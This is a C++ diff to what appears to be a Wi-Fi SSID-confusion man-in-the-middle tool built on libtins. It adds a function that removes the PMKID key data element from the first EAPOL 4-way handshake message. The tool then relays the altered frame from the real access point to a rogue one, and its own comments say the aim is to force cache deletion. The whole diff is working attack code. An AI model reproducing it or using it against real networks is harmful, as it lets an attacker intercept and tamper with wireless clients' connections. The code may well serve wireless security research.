@@ -9,6 +9,39 @@ using namespace Tins;
 using namespace std;
 using namespace std::chrono;
 
+//TODO test
+// Strip PMKID KDE (DD 14 00 0F AC 04 + 16B) from EAPOL-Key msg1 key data.
+// Msg1 has no MIC, so key data is unprotected plaintext — no key material needed.
+static bool strip_pmkid_kde(frame_raw_t &raw) {
+    static constexpr uint8_t snap_eapol[] = {0x88, 0x8e};
+	const auto snap = ranges::search(raw, snap_eapol).begin();
+    if(snap == raw.end()) return false;
+    const size_t eapol_off = (snap - raw.begin()) + 2;
+    if(eapol_off + 99 > raw.size()) return false;
+
+    const size_t kdlen_off = eapol_off + 97;
+    uint16_t kdlen = (static_cast<uint16_t>(raw[kdlen_off]) << 8) | raw[kdlen_off + 1];
+    if(kdlen < 22 || eapol_off + 99 + kdlen > raw.size()) return false;
+
+    static constexpr uint8_t pmkid_kde[] = {0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04};
+    const auto kde_start = raw.begin() + static_cast<ptrdiff_t>(eapol_off + 99);
+    const auto kde_end   = kde_start + kdlen;
+    auto kde = std::search(kde_start, kde_end, std::begin(pmkid_kde), std::end(pmkid_kde));
+    if(kde == kde_end) return false;
+
+    raw.erase(kde, kde + 22);
+    kdlen -= 22;
+    raw[kdlen_off]     = static_cast<uint8_t>(kdlen >> 8);
+    raw[kdlen_off + 1] = static_cast<uint8_t>(kdlen);
+
+    const size_t pktlen_off = eapol_off + 2;
+    uint16_t pktlen = (static_cast<uint16_t>(raw[pktlen_off]) << 8) | raw[pktlen_off + 1];
+    pktlen -= 22;
+    raw[pktlen_off]     = static_cast<uint8_t>(pktlen >> 8);
+    raw[pktlen_off + 1] = static_cast<uint8_t>(pktlen);
+    return true;
+}
+
 void SsidConfusion::send_to_rogue(PDU &pdu) const {
 	const std::vector<uint8_t> raw = pdu.serialize();
 	send_to_rogue(raw);
@@ -28,6 +61,13 @@ FrameProcess SsidConfusion::handle_eapol_real(
 		//TODO check first M1as PMKSA cache hit -> force EAP restart
 		const int msg = get_eapol_msg_num(pdu);
 		if(msg == 2 || msg == 4) return STOP; //block cycles
+		if(msg == 1) {
+			frame_raw_t stripped = raw;
+			strip_pmkid_kde(stripped); //TODO add to mc_mitm as well (force delete PKMSA)
+			display_traffic(pdu, "Real channel", " [EAPOL 1/4, PMKID stripped] -- MitM'ing");
+			send_to_rogue(stripped);
+			return STOP;
+		}
 		if(msg != -1) return CONTINUE;
 		display_traffic(pdu, "Real channel", " AP -> STA  -- MitM'ing ");
 		send_to_rogue(raw);
